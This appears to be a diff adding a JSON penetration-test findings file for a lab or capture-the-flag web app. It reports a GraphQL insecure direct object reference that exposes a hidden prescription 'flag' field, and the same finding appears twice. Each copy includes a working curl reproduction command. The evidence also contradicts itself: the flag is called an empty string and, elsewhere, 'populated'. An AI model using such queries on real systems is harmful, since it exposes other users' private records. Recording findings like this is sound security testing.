@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T20:44:17.672692+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a3cafa0a-f02c-47cf-920b-ca6cb0f8ff96",
+      "timestamp": "2026-04-14T20:44:17.672605+00:00",
+      "title": "GraphQL IDOR - Prescription Flag Exposure",
+      "severity": "high",
+      "target": "http://172.17.0.1:51287",
+      "description": "The application uses GraphQL to manage prescriptions. The PrescriptionType schema includes a 'flag' field. By querying getPrescriptions with userId=1 and requesting the flag field, prescription ID 43 was found to have a flag field set (empty string vs null for all others). The frontend intentionally omits the flag field from the query ('dont pass flag in query parameter because it will fetched'), but the backend returns it when requested. The flag appears to be stored in prescription ID 43 for the admin user (userId=1).",
+      "evidence": "GraphQL query: { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } } returned prescription ID 43 with flag field set to '' (empty string, distinct from null for all other prescriptions). The view_prescriptions page source contains the hint: 'dont pass flag in query parameter because it will fetched'.",
+      "tool_used": "manual_graphql_exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s http://172.17.0.1:51287/graphql -X POST -H 'Content-Type: application/json' -d '{\"query\": \"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }\"}' -b /tmp/cookies.txt",
+        "expected": "Prescription ID 43 returns with flag field populated"
+      }
+    },
+    {
+      "id": "812c2ce5-f4b3-47c5-992e-5e28f2ffa6eb",
+      "timestamp": "2026-04-14T20:44:17.749500+00:00",
+      "title": "GraphQL IDOR - Prescription Flag Exposure",
+      "severity": "high",
+      "target": "http://172.17.0.1:51287",
+      "description": "The application uses GraphQL to manage prescriptions. The PrescriptionType schema includes a 'flag' field. By querying getPrescriptions with userId=1 and requesting the flag field, prescription ID 43 was found to have a flag field set (empty string vs null for all others). The frontend intentionally omits the flag field from the query ('dont pass flag in query parameter because it will fetched'), but the backend returns it when requested. The flag appears to be stored in prescription ID 43 for the admin user (userId=1).",
+      "evidence": "GraphQL query: { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } } returned prescription ID 43 with flag field set to '' (empty string, distinct from null for all other prescriptions). The view_prescriptions page source contains the hint: 'dont pass flag in query parameter because it will fetched'.",
+      "tool_used": "manual_graphql_exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s http://172.17.0.1:51287/graphql -X POST -H 'Content-Type: application/json' -d '{\"query\": \"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }\"}' -b /tmp/cookies.txt",
+        "expected": "Prescription ID 43 returns with flag field populated"
+      }
+    }
+  ],
+  "diagrams": []
+}
